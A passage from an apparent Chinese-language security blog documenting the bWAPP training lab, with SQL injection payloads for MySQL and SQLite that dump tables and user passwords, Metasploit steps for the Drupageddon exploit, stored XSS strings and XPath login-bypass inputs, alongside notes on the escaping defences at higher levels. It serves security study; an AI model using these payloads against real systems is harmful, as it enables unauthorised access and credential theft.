cjk_fallback">据</span><span class="mord cjk_fallback">库</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">搜</span><span class="mord cjk_fallback">索</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">返</span><span class="mord cjk_fallback">回</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">即</span></span></span></span>row[&quot;login&quot;]返回不为空，这里第一个条件就构成了。后面POST的“&amp;password=3”，3的hash的值被我们添加到联合查询语句里了，即返回的查询有3的hash值</p>
<p>所以输入密码与联合查询输入的3字段相等即可<br>
用户名:  ' union select 1,2,&quot;77de68daecd823babbb58edb1c8e14d7106e83bb&quot;,4,5,6,7,8,9 #<br>
密码  :  3<br>
其中,   sha1(3) 加密后为 77de68daecd823babbb58edb1c8e14d7106e83bb<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620731798272.png" alt="" loading="lazy"><br>
得知注入字段显示顺序为2和5</p>
<p>当前数据库和用户</p>
<pre><code>用户名:  ' union select 1,database(),&quot;77de68daecd823babbb58edb1c8e14d7106e83bb&quot;,4,user(),6,7,8,9 #
密码  :  3
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620731803242.png" alt="" loading="lazy"><br>
爆表</p>
<pre><code>用户名:  ' union select 1,database(),&quot;77de68daecd823babbb58edb1c8e14d7106e83bb&quot;,4,(select group_concat(table_name) from information_schema.tables where table_schema=database()),6,7,8,9 #
密码  :  3
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620731807822.png" alt="" loading="lazy"><br>
users表的所有字段</p>
<pre><code>用户名:  ' union select 1,database(),&quot;77de68daecd823babbb58edb1c8e14d7106e83bb&quot;,4,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; and table_schema=database()),6,7,8,9 #
密码  :  3
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620731812892.png" alt="" loading="lazy"><br>
爆值</p>
<pre><code>用户名:  ' union select 1,database(),&quot;77de68daecd823babbb58edb1c8e14d7106e83bb&quot;,4,(select group_concat('~',login,'~',password) from users),6,7,8,9 #
密码  :  3
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620731818162.png" alt="" loading="lazy"><br>
<strong>Medium&amp;High</strong><br>
查看源码发现对用户名和密码进行了相应的防护:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620731824124.png" alt="" loading="lazy"><br>
分别用了addslashes()和mysql_real_escape_string()函数防御,<br>
且在mysql编码为utf-8, 无法用宽字节绕过, 安全。</p>
<h1 id="sql-injection-sqlite">SQL Injection (SQLite)</h1>
<p>首先需要安装SQLite插件:</p>
<pre><code>apt-get install sqlite3
apt-get install php5-sqlite
</code></pre>
<p>然后重启一下apache:<br>
service apache2 restart<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620728399038.png" alt="" loading="lazy"><br>
SQLite介绍<br>
SQLite含有一张内置表&quot;sqlite_master&quot;,表里存储着type,name,tbl_name,rootpage,sql五个字段。<br>
type列记录了项目的类型，如table,index,view,trigger<br>
tbl_name字段记录所从属的表名,如索引所在的表名。对于表来说，该列就是表名本身；<br>
name字段记录了项目的名称，如表名，索引名等；<br>
rootpage记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者null<br>
sql存放着所有的表的创建语句，即表的结构。<br>
<strong>1.low</strong><br>
注入单引号，只会报错 Error:HY000,可能是sqlite的报错标注：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620729680952.png" alt="" loading="lazy"><br>
根据查询功能，很明显为模糊匹配：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620729686729.png" alt="" loading="lazy"><br>
于是得出sql语句为：<br>
select * from books where title='%$title%';<br>
判断注入点</p>
<pre><code>Iron%' and 1=1 --
</code></pre>
<p>注意在sqlite中，注释符为：--<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620729690041.png" alt="" loading="lazy"><br>
判断字段数</p>
<pre><code>Iron%' order by 6 --
</code></pre>
<p>判断字段显示顺序</p>
<pre><code>123%' union select 1,2,3,4,5,6 --
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620729694271.png" alt="" loading="lazy"><br>
爆出所有表</p>
<pre><code>123%' union select 1,sqlite_version(),name,4,5,6 from sqlite_master --
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620729698710.png" alt="" loading="lazy"><br>
users表的字段</p>
<pre><code>123%' union select 1,sqlite_version,sql,4,5,6 from sqlite_master --
</code></pre>
<p>通过sql可以查看建表语句，从而得到字段属性：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620729703818.png" alt="" loading="lazy"><br>
取值</p>
<pre><code>123%' union select 1,2,login,password,5,6 from users --
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620729707547.png" alt="" loading="lazy"><br>
<strong>Medium&amp;High</strong><br>
在medium和high等级中，都过滤了单引号，无法注入：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620729711652.png" alt="" loading="lazy"></p>
<h1 id="drupal-sql-injection-drupageddon完全看不懂">Drupal SQL Injection (Drupageddon)(完全看不懂)</h1>
<p>CVE-2014-3704:<br>
翻译一下就是:  由于expandArguments()函数没有正确构造准备好的语句，这使得远程攻击者能够通过包含精心编制的手工语句进行SQL注入攻击。影响Drupal版本在7.x~1.32。</p>
<p>Drupal是一款开源内容管理系统（CMS），用户多达100万以上（包括政府、电子零售、企业组织、金融机构等），除非已经安装了针对Drupalgeddon 漏洞的安全补丁，否则，所有用户都会面临该漏洞的严重威胁。</p>
<p>bwapp平台复现了漏洞,  但仅仅再bee-box平台中体现:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620733259408.png" alt="" loading="lazy"><br>
由于没有安装bee-box的支持,  所以演示步骤, 不贴结果。具体可移步到 vulhub篇</p>
<p>直接上msf:</p>
<p>搜索drupal漏洞:</p>
<pre><code>search drupal
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620733263162.png" alt="" loading="lazy"><br>
查看漏洞信息:</p>
<pre><code>show info exploit/multi/http/drupal_drupageddon
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620733268252.png" alt="" loading="lazy"><br>
使用CVE-2014-3704对应的攻击模块:</p>
<pre><code>use exploit/multi/http/drupal_drupageddon
</code></pre>
<p>设置Drupal网站路径:</p>
<pre><code>set targeturi /drupal/
</code></pre>
<p>所定攻击的ip和端口:</p>
<pre><code>set RHOSTS 192.168.10.10

set rport 8080
</code></pre>
<p>发动攻击,  拿到shell:</p>
<pre><code>exploit
</code></pre>
<h1 id="sql-injection-stored-blog">SQL Injection - Stored (Blog)</h1>
<p>一个发表blog的功能<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620736059619.png" alt="" loading="lazy"><br>
分析<br>
1.在将blog内容以及事件作者等插入数据库的过程中，肯定用到了insert语句，对应的就可以采用sql注入<br>
2.观察插入之后的内容，被写入到网页中，这里就类似于存储型xss<br>
<strong>1.low</strong><br>
sql注入<br>
注入单引号，得到回显<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620736064646.png" alt="" loading="lazy"><br>
所以猜测sql语句为：</p>
<pre><code>insert into blog(date,entry,owner) values(now(),'$entry','bee');
</code></pre>
<p>注入点为entry处，可以将前面的values（）闭合掉，然后再加上注入内容即可<br>
判断注入点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620736087372.png" alt="" loading="lazy"><br>
1。联合查询注入</p>
<pre><code>test',(select database()))#
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620736097800.png" alt="" loading="lazy"><br>
爆表</p>
<pre><code>test',(select group_concat(table_name) from information_schema.tables where table_schema=database()))#
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620736113736.png" alt="" loading="lazy"><br>
2.报错注入<br>
尝试报错注入</p>
<pre><code>test',(extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))))#
test',(extractvalue(1,concat(0x7e,(select database()),0x7e))))#
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620735463361.png" alt="" loading="lazy"><br>
然后再尝试xss<br>
注入</p>
<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620736121461.png" alt="" loading="lazy"><br>
<strong>medium&amp;high</strong><br>
注入的单引号发现被转义了:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620736129705.png" alt="" loading="lazy"><br>
查看源码，发现两个等级分别用了addslashes（）和mysqli_real_escape_string（）函数做防护：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620736133750.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620736137137.png" alt="" loading="lazy"><br>
XSS<br>
但没有对xss进行相应的防护(只有medium适用，high不适用)</p>
<pre><code>&lt;scirpt&gt;alert(2)&lt;/script&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620736141135.png" alt="" loading="lazy"><br>
<strong>SQL Injection -Stored (SQLite)</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620739936000.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620739942000.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620739946198.png" alt="" loading="lazy"><br>
Let’s try with single quote<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620739952399.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620739956019.png" alt="" loading="lazy"><br>
The entry was added but it’s not showing anything which mean we found the SQLi<br>
Now we have to find the correct syntax so we can see the output of the sqli on the webpage<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620739961314.png" alt="" loading="lazy"><br>
’,’’);<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620739979465.png" alt="" loading="lazy"><br>
As you can see with ’,’’); we could add a blank entry in the blog<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620739985255.png" alt="" loading="lazy"><br>
’, sqlite_version());<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620739990150.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620739994558.png" alt="" loading="lazy"><br>
’, (SELECT name FROM sqlite_master WHERE type=’table’));<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620740000297.png" alt="" loading="lazy"><br>
Table name is blog, using this method you can enumerate it further.</p>
<h1 id="sql-injection-stored-user-agent">SQL Injection - Stored (User-Agent)</h1>
<p>当用户访问页面时,  后台会获取用户的ip, 访问时间以及http头信息的内容:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620740563248.png" alt="" loading="lazy"><br>
并且将获取到的信息存储到数据库,  然后再显示到页面上。</p>
<p><strong>1.low</strong><br>
原理同样,  猜测insert的sql语句为:</p>
<pre><code>INSERT INTO blog (date, user_agent, ip_address) VALUES(now(), '$user-agent','$ip');
</code></pre>
<p>抓包,  注入点为 user-agent:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620740616275.png" alt="" loading="lazy"><br>
<strong>Medium&amp;High</strong><br>
查看源码,  发现两个等级分别用了addslashes()和mysqli_real_escape_string()函数做防护, 安全:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620740647746.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620740653437.png" alt="" loading="lazy"></p>
<h1 id="sql-injection-storedxml">SQL Injection-Stored(XML)</h1>
<p><strong>1.low</strong><br>
当点击按钮后网络中会出现post请求文件打开为sqli_8-2.php<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620783230083.png" alt="" loading="lazy"><br>
然后抓包猜测sql语句<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620783291927.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620783295114.png" alt="" loading="lazy"><br>
则猜测sql语句为：</p>
<pre><code>update users set secret = '$secret' where login = '$login';
</code></pre>
<p>因为这里有报错，我们试试报错注入<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620783371442.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620783374943.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620783378636.png" alt="" loading="lazy"><br>
<strong>medium&amp;high</strong><br>
已经防御不能注入</p>
<h1 id="sql-injection-blind-boolean-based">SQL Injection-Blind-Boolean-Based</h1>
<p><strong>1.low</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620785227217.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620785232440.png" alt="" loading="lazy"><br>
一般字符型注入可用#,--+闭合，但是这里说明识别不了#只能识别--+<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620785366274.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620785372615.png" alt="" loading="lazy"><br>
这里检测database()=3,或者database()=5会发现回显不一样<br>
<strong>medium&amp;high</strong><br>
已经防御不能注入<br>
SQL-Injection-Blind-Time-Based<br>
<strong>1.low</strong></p>
<pre><code>title=1'+or+sleep(5)--+
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620786657411.png" alt="" loading="lazy"><br>
发现页面缓冲所以存在延时注入<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620786678476.png" alt="" loading="lazy"><br>
这里明显不正确。<br>
所以当length长度为5时，回显正确<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620786812646.png" alt="" loading="lazy"><br>
说明数据库长度为5<br>
<strong>medium&amp;high</strong><br>
同样采用了addslashed()和mysqli_real_escape_string()函数,</p>
<p>且mysql编码和os编码一致, 无法用宽字节绕过, 安全。</p>
<h1 id="sql-injection-blind-sqlite">SQL Injection - Blind (SQLite)</h1>
<p>同样是布尔盲注:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620792767750.png" alt="" loading="lazy"><br>
方法思路一样,  和mysql相比只不过是语法不同。</p>
<h1 id="xmlxpath-injection-login-form">XML/XPath Injection (Login Form)</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620794842982.png" alt="" loading="lazy"><br>
可知是利用了xml/xpath解析的用户登录信息。<br>
XPath注入的原理其实和sql注入很像， XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作，但是，注入的对象不是数据库users表了，而是一个存储数据的XML文件。攻击者可以获取 XML 数据的组织结构，或者访问在正常情况下不允许访问的数据，如果 XML 数据被用于用户认证，那么攻击者就可以提升他的权限。因为xpath不存在访问控制，所以我们不会遇到许多在SQL注入中经常遇到的访问限制。XML 中没有访问控制或者用户认证，如果用户有权限使用 XPath 查询，并且之间没有防御系统或者查询语句没有被防御系统过滤，那么用户就能够访问整个 XML 文档。 注入出现的位置也就是cookie，headers，request parameters/input等。<br>
<strong>1.Low</strong><br>
以这关的登录验证模块为例，说明 XPath注入攻击的实现原理。</p>
<p>在Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password） 两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在XML文件中，其原理是通过查找XML文件中的用户名 （username）和密码（password）的结果来进行授权访问，</p>
<p>白盒测试<br>
查看源码得知是通过读取heroes.xml文件的内容, 并且通过xpath寻找用户的账户和密码来验证登录:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620794965921.png" alt="" loading="lazy"><br>
继续查看heroes.xml文件内容,  是一个xml文件, 里面包含了用户名和登录密码等信息:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620794977115.png" alt="" loading="lazy"><br>
根据xpath语句:</p>
<pre><code>/heroes/hero[login='$login' and password='$password']
</code></pre>
<p>在没有对login和password参数作任何防护的情况下,  可以构造xpath语句进行注入</p>
<p>这里注入点选择login参数, 将$login前面的单引号闭合,  加入永真条件1=1,  构造一个万能登录的payload:</p>
<pre><code>hack' or 1=1 or '
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620795053972.png" alt="" loading="lazy"><br>
<strong>Medium&amp;High</strong><br>
这两个级别中,  都对xpath语法进行了严格的过滤, 安全:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620795069328.png" alt="" loading="lazy"></p>
<h1 id="xmlxpath-injection-search">XML/XPath Injection (Search)</h1>
<p>这关通过简单的类别搜索来查找电影名称</p>
<p>如下就是查找科幻类的电影:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620795745700.png" alt="" loading="lazy"><br>
<strong>1.Low</strong><br>
黑盒测试<br>
通过url更改参数注入单引号,  从得到报错信息得知: 服务端是用了xml的解析<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620795769985.png" alt="" loading="lazy"><br>
白盒测试<br>
查看源码, 看到的确是读取了一个包含电影信息的xml文件, 然后再利用xpath提取信息:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620795808921.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620795812643.png" alt="" loading="lazy"><br>
关键xpath语句如下:</p>
<pre><code>//hero[contains(genre, '$genre')]/movie
</code></pre>
<p>大概表示所有属性值genre为<code>$genre</code>的hero标签下的movie元素值</p>
<p>这里的genre参数是可控的,  攻击者可以构造恶意xpath语句来获取整个xml文档的信息:</p>
<p>比如,  通过闭合<code>$genre</code>前面的单引号,  然后在后面选取hero的password元素值; 最后用一个 | 运算符将movie闭合好:</p>
<pre><code>horror')]/password | hack[contains(a,'
</code></pre>
<p>注入后的xpath语句为:</p>
<pre><code>//hero[contains(genre, 'horror')]/password | hack[contains(a,'')]/movie
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620796051036.png" alt="" loading="lazy"><br>
当然也有其他payload, 感兴趣的自行脑补。</p>
<p><strong>Medium&amp;High</strong><br>
同样对xpath语法进行了严格的过滤, 安全:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620796073392.png" alt="" loading="lazy"></p>
<p>原文链接：https://blog.csdn.net/angry_program/article/detail<br>
原文链接：https://blog.csdn.net/angry_program/article/details/104644236/<br>
原文链接：https://teckk2.github.io/web-pentesting/2018/02/07/SQL-Injection-Stored-(SQLite).html<br>
原文链接：https://blog.csdn.net/angry_program/article/details/104545171<br>
原文链接：https://blog.csdn.net/weixin_38167363/article/details/99932426</p>

            </div>
          </article>
        </div>
        <div class="paper" data-aos="fade-in">
          
            <div class="next-post">
              <div class="next">
                下一篇
              </div>
              <a href="https://jinqipiaopiao.github.io/post/xss-labs11-20/">
                <h3 class="post-title">
                  xss-labs(11-20)
                </h3>
              </a>
            </div>
          
        </div>
        
      </div>

      <div class="sm-12 md-4 col sidebar">
  <div class="paper info-container">
    <img src="https://jinqipiaopiao.github.io//images/avatar.png?v=1627392642729" class="no-responsive avatar">
    <div class="text-muted">温故而知新</div>
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
  </div>
  <div class="paper">
    <div class="sidebar-title">
      最新文章
    </div>
    <div class="row">
      <ul>
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/shu-jia-xue-xi-bi-ji-ji-lu/">暑假学习笔记记录</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/sql-zhu-ru-guo-lu-zi-fu-de-fuzz-jiao-ben-ce-shi/">SQL注入过滤字符的Fuzz脚本测试</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/md5-xiang-guan-bi-jiao/">md5相关比较</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/buuctf/">BUUCTF</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/li-yong-yu-bian-yi-lai-sql-zhu-ru/">利用预编译来SQL注入</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/python-mo-ban-zhu-ru/">Python-模板注入</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/web-an-quan-xiang-guan-zhi-shi-dian/">web安全相关知识点</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/userini-wen-jian-gou-cheng-de-php-hou-men/">.user.ini文件构成的PHP后门</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/ying-yong-ceng-xie-yi/">应用层协议</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/ju-yu-wang-jiao-huan-ji-an-quan/">局域网交换机安全</a>
            </li>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </div>
  </div>
  <div class="paper">
    <div class="sidebar-title">
      标签列表
    </div>
    <div class="row">
      
        <a href="https://jinqipiaopiao.github.io/tag/I-a6dyp2Q/" class="badge secondary">
          Gridea
        </a>
      
    </div>
  </div>
  <div class="paper">
    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://jinqipiaopiao.github.io//atom.xml" target="_blank">RSS</a>
  </div>
</div>


    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>

<script type="application/javascript">

AOS.init();

hljs.initHighlightingOnLoad()

</script>




  </body>
</html>
